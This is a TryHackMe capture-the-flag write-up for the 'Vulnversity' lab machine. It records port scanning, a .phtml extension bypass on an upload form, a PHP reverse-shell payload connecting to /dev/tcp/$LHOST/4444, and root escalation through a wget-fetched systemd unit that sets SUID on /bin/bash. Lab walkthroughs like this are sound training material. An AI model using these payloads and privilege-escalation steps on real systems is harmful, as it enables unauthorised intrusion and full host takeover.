# Vulnversity — TryHackMe Writeup

**Target:** `TARGET_IP` (10.128.172.212 at time of solve)
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Tech stack:** vsftpd 3.0.5, OpenSSH 8.2p1, Samba 4, Squid 4.10, Apache 2.4.41 on **`:3333`**
**Exploit chain:** ferox → `internal/uploads/` → `.php` filter → `.phtml` bypass → reverse shell as `www-data` → `systemctl` allowed for `bill` → drop `/tmp/root.service` with `chmod +s /bin/bash` → `bash -p` → root

---

## Attack Chain Overview

```
nmap → 21, 22, 139, 445, 3128, 3333
        ↓
feroxbuster :3333 → /internal/uploads/ (open dir listing)
        ↓
upload form rejects .php → rename to .phtml → uploaded
        ↓
GET /internal/uploads/shell.phtml → reverse shell (www-data)
        ↓
su bill / find creds → systemctl allowed
        ↓
wget /tmp/root.service { ExecStart=chmod +s /bin/bash }
systemctl enable /tmp/root.service && systemctl start root
        ↓
/bin/bash -p → root → /root/root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Initial Access — `.phtml` Upload Bypass](#3-initial-access--phtml-upload-bypass)
4. [Foothold (`www-data`)](#4-foothold-www-data)
5. [Privilege Escalation — Systemd Unit Drop](#5-privilege-escalation--systemd-unit-drop)
6. [Key Takeaways](#6-key-takeaways)

---

## 1. Reconnaissance

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p21,22,445,139,3128,3333 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 21/tcp | vsftpd 3.0.5 |
| 22/tcp | OpenSSH 8.2p1 |
| 139, 445/tcp | Samba 4 |
| 3128/tcp | Squid 4.10 |
| **3333/tcp** | Apache 2.4.41 — *Vuln University* |

The web app on the **non-standard port** is the entry point. See [nmap.md](../../tools/recon/nmap.md).

---

## 2. Web Enumeration

```bash
feroxbuster -u http://$TARGET:3333 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
# /internal/             → upload form
# /internal/uploads/     → directory listing of past uploads (giveaway)
```

A directory listing under `/uploads/` means anything we land there is reachable by URL.

See [feroxbuster.md](../../tools/fuzz/feroxbuster.md).

---

## 3. Initial Access — `.phtml` Upload Bypass

Full technique: [php-extension-bypass-upload.md](../../exploits/web-rce/php-extension-bypass-upload.md).

The form filters by extension. `.php` is rejected; **`.phtml` is not**, and Apache's `mod_php` config still maps it to the PHP handler.

### 3a. Payload

```php
<?php
system('bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"');
?>
```

Save as `shell.phtml` (or rename in Burp from `shell.php` if the form accepts it).

### 3b. Upload + trigger

```bash
nc -lvnp 4444
# Upload via the form, then:
curl http://$TARGET:3333/internal/uploads/shell.phtml
# whoami → www-data
```

### 3c. Stabilise

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

---

## 4. Foothold (`www-data`)

Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md).

```bash
# SUID sweep — empty / nothing pivots
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# bill is the local user; check for creds & sudo on his behalf
ls -la /home/bill
sudo -l -U bill
# (root) NOPASSWD: /bin/systemctl
```

`systemctl` allowed without a password is the privesc primitive.

---

## 5. Privilege Escalation — Systemd Unit Drop

Full technique: [systemd-service-privesc.md](../../exploits/privesc-linux/systemd-service-privesc.md).

### 5a. Build the unit on the attacker

```ini
# root.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target
```

### 5b. Stage on the target

```bash
# Attacker
python3 -m http.server 3333

# Target (as bill)
cd /tmp
wget http://$LHOST:3333/root.service
```

### 5c. Enable + start

```bash
systemctl enable /tmp/root.service
systemctl start root
```

### 5d. Cash in

```bash
ls -l /bin/bash
# -rwsr-xr-x 1 root root … /bin/bash
/bin/bash -p
# whoami → root
cat /root/root.txt
```

`-p` keeps the EUID intact when bash is SUID — without it, modern bash drops privileges.

---

## 6. Key Takeaways

- `.php` blacklists are usually a 30-second bypass: `.phtml`, `.phar`, `.pht`, `.php3`-`7`. Apache's stock `mods-available/php*.conf` whitelists most of them.
- A `/uploads/` directory with **directory listing on** is half the attack — visit it after every upload to grab the on-disk path.
- `sudo -l` of a local user (or `cat /etc/sudoers.d/*` from `www-data`) is the first privesc check after a foothold. NOPASSWD on `systemctl` is full root in one unit-file drop.
- `Type=oneshot` + `ExecStart=/bin/bash -c "chmod +s /bin/bash"` is the cleanest unit privesc payload — survives reboot, no listener, instant `bash -p`.
- Web on a non-standard port (`:3333`) is a recurring early-difficulty pattern; always nmap the full range, not just `-p80,443`.

---

## Related Notes
- [php-extension-bypass-upload.md](../../exploits/web-rce/php-extension-bypass-upload.md) — initial access
- [systemd-service-privesc.md](../../exploits/privesc-linux/systemd-service-privesc.md) — root primitive
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md) — foothold playbook
- [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [netcat](../../tools/pivot/netcat.md), [wget](../../tools/web/wget.md)
